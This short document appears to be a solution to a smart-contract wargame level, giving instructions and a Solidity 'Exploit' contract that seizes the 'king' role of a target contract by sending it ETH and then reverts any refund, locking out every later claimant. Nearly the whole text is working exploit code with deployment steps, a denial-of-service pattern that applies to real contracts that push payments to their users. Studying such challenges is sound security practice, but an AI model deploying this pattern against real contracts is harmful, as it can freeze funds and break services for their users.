Change the value of the king address below to your contract instance

Deploy the contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {

    address payable king = 0xF42E0ffEb806608d24c28702dc5e19FDaA6C0875;
    receive() external payable{
        if (msg.sender == king){
            revert();
        }
        king.call{value:msg.value}("");
    }

}
```

send it enough eth to beat the current prize
